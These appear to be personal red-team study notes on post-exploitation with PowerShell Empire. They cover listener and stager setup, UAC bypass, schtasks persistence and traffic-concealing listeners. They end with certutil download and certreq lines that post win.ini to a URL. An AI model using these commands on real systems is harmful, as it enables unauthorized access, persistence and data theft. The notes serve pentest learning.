Post exploitation

04/11/2020 15:16
* Xmind notes 
--------------------------
make a docker of win7 professional 7601 sp1 x64
# **Powershell Empire**

**Powershell** is a C2(Command and Control server) which is open source
developed by **BC-Security**
Used to deploy agents onto a device and remotely run modules.
Paid alternative - Cobalt Strike C2
Used in red teaming and pentesting assisments.

So a listener and stager is to be setup.

**Listener -** Are the channels which receive connections from our target machine.



![Listner.png](../_resources/0624cc281367420e87887bddabf609c5.png)



**Stager	 -** Are used used to set the stage for the **post-exploitation** activities. They are similar to payloads, which are used to create a connection back to PowerShell Empire.
Payload get sends in Stages like particular section of payload is sent in every stage.

**Agents -** are the connection which we establish with out stages on the target machines.

**Modules -** used to perform specific function, such as deploy specific shellcode.


**For doing this you rneed to have the shell and Empire installed on host**


**GUI Version -** [Starkiller](https://github.com/BC-SECURITY/Starkiller/releases)

Default Credentials:

`Uri: 127.0.0.1:1337`
`User: empireadmin`
`Pass: password`

Modes of using Empire

REST api service:
`powershell-empire --rest`

GUI:
`./starkiller.appimage`


### Using listener 

`listeners`- enter in listening mode
`uselistener <tab>` - you can use any listeners so if the listener is **http**. So listener will be host on `port 80`

`list` - shows the activated listeners.

**Get inforamtion of used listener**
`info` - shows the information about the listeners.
Here we can also use same as metasploit set the `port` or `BindIP` or other things.

`(Empire)>(listeners)>kill 'name'` - **kill listeners**
### Using Stager

`usestager <tab>` - use any stager 

In this one we need to set our listener that we previously created.
`set Listener <name>` - name of listener that we specified previously.


`execute` - execeute the stager 

**After execution we get the Agent list by `agents`**
`rename <old_agent_name> <new_name>`

## Interacting with the targets

`interact <agent_name>` 
 
 
## Exploitation

`bypassuac` - By this one we spawn a high-integrity(admin priv.) agent like we can even start mimekatz or kiwi to exfiltration.
**we can run commands normally like we have a shell**

`info` - we have the information of our privilleges and also the process.

## Escilating the privileges

`bypassuac <listener_name>` - bypass use access control

### Using module
`usemodule <tab>` - gives the list of modules

`/persistence/elevated/schtasks*` - From this we can schedule your agent to ru when someone logs into the system.
by setting the parameter and setting up the Listener.

--------------------------
What are HTTP COMs and how they are used to conceal traffic in listeners part?

**http_com** - Uses the standard HTTP listener with an IE COM object.
**http_foreign** - Used to point to a different Empire server.
**http_hop** - Used for creating an external redirector using PHP.
**http_mapi** - Uses the standard HTTP listener with a MAPI COM object.

--------------------------

These all uses various built out services or have unique features that make them different from other listeners

**meterpreter** - Used to listen for Metasploit stagers.
**onedrive** - Utilizes OneDrive as the listening platform.
**redirector** - Uses creating pivots in a network.
**dbx** - Utilizes Dropbox as the listening platform.
**http_malleable** - Used alongside the malleable C2 profiles from BC-Security.



**Transfering file:**
`certutil -urlcache -f <url>/file file`


**Alternative:**

https://lolbas-project.github.io/lolbas/Binaries/Certreq/

`certreq -q -post -config <URL> %windir%\win.ini %appdir%\r || (if not exist %windir%\OCR certutil -urlcache -split -^f <URL> %appdir%\r &`